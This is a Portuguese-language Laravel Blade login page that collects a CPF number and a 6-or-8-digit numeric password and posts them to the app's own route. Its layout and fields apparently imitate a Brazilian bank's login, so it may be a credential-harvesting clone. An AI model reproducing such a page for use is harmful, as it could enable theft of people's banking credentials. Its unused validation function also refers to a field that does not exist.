<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{asset('assets/css/process_style.css')}}">
    <title>Autênticação</title>
</head>

<body>
    <div class="divlogo"><img class="logo" style=" max-width: 165px;
    padding-top: 20px;" src="{{asset('assets/images/991192.png')}}"><br>
        <div style="max-width:80%;">
            <p style="color:#3a4859;display:block;" id="showuser">Informe seu CPF e clique em "Próximo" para continuar.</p>
            <p style="color:#3a4859;visibility: hidden;" id="showauth">Digite sua senha de 6 ou 8 Dígitos e Aperte em "Confirmar".</p>
        </div>
    </div>
  
    <form class="login-form" action="{{route('login.auth')}}" method="post">
        @csrf
        <div class="form-container">
            <div id="user" class="form-group">
                <label for="user" style="color: #005ca9; font-weight: bold;"><i class="fa-regular fa-user"></i> CPF</label>
                <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required="" minlength="11" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
            </div>

            <div id="auth" class="form-group">
                <label for="auth" style="color: #005ca9; font-weight: bold;"><i class="fa-solid fa-lock"></i> SENHA</label>
                <input type="password" id="password" name="password" placeholder="6 ou 8 Dígitos" minlength="6" maxlength="8" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required="">
            </div>
            @if (session()->has('mensagem.falha'))
            <div class="row">
                <div class="col-4 mx-auto">
                    <div class="alert alert-danger" role="alert">
                        {{session('mensagem.falha')}}
                            
                    </div>
                </div>
            </div>
                @endif

            <div class="form-group">
                <button id="autenticar" type="submit">Próximo</button>
            </div>
            <div style="text-align:center;color:#0077db;">É novo por aqui? <a style="text-decoration: none; color:#0077db" href="{{route('cadastro.create')}}">Cadastre-se</a><br><i class="fa-solid fa-circle-question"></i> Preciso de ajuda</div>
        </div>

        
    </form>
    
  


    <script src="{{asset('assets/js/96865da6b4.js')}}" crossorigin="anonymous"></script>
    <script>
        function validateForm() {
            var password = document.getElementsByName('auth')[0].value;

            // Verifica se a senha tem pelo menos 6 ou 8 dígitos numéricos
            if (password.length < 6 || password.length === 7 || password.length > 8) {
                alert('A senha deve ter pelo menos 6 e no máximo 8 dígitos.');
                return false; // Para impedir o envio do formulário
            }

            return true; // Permite o envio do formulário se a senha tiver entre 6 e 8 dígitos
        }
    </script>


    <script src="{{asset('assets/js/script.js')}}" defer=""></script>


</body>
</html>

